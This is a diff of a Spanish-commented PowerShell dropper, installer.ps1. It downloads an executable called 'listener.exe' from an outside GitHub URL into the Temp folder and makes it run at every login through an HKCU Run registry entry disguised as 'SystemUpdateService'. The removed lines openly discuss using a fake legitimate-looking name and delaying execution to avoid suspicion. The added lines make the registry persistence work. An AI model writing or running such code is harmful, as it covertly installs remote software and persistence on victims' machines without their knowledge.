@@ -1,34 +1,38 @@
 # installer.ps1
 # Objetivo: Descargar x.exe y establecer persistencia vía Registro (HKCU Run)
-# Esto evita los problemas de permisos de la Task Scheduler y carpetas Temp.
 
-$targetPath = "$env:TEMP\chromeUpdater.exe"
-$downloadUrl = "https://raw.githubusercontent.com/C5rsdMat1X5/middle-server-comms/refs/heads/master/execs/listener.exe" # Cambia esto por tu URL real si es diferente
-$regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
-$regName = "SystemUpdateService" # Nombre falso para parecer legítimo
+$targetPath = "$env:TEMP\x.exe"
+$downloadUrl = "https://raw.githubusercontent.com/C5rsdMat1X5/middle-server-comms/refs/heads/master/execs/listener.exe"
+# IMPORTANTE: Cambia la URL arriba si necesitas descargar un archivo real diferente.
+# Si example.com/x.exe no existe, la descarga fallará silenciosamente o dará error.
+
+# La ruta del registro DEBE tener el prefixo 'Registry::' para funcionar
+$regPath = "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+$regName = "SystemUpdateService"
 
 # 1. Descargar el archivo
 try {
+    # Usamos Invoke-WebRequest. Si la URL no es válida o el archivo no existe, esto fallará.
     Invoke-WebRequest -Uri $downloadUrl -OutFile $targetPath -UseBasicParsing
 }
 catch {
-    # Si falla la descarga, no podemos continuar
+    # Error silencioso o salida. En una demo real, podrías querer logear esto.
     exit 1
 }
 
 # 2. Establecer persistencia vía Registro
-# Esto funciona sin permisos de administrador y no es bloqueado por estar en Temp
 try {
+    # Asegurarse de que la ruta existe (aunque HKCU\...\Run suele existir por defecto)
+    if (!(Test-Path $regPath)) {
+        New-Item -Path $regPath -Force
+    }
+
+    # Crear la entrada en el registro
     New-ItemProperty -Path $regPath -Name $regName -Value $targetPath -PropertyType STRING -Force
 }
 catch {
-    # Si falla, el script termina. No hacemos ruido.
+    # Si falla, salimos.
     exit 1
 }
-
-# 3. (Opcional) No ejecutamos inmediatamente para no levantar sospechas,
-# la persistencia se activará en el siguiente reinicio/inicio de sesión.
-# Si necesitas probar que funciona, descomenta la siguiente línea:
-# Start-Process $targetPath
 
 exit 0
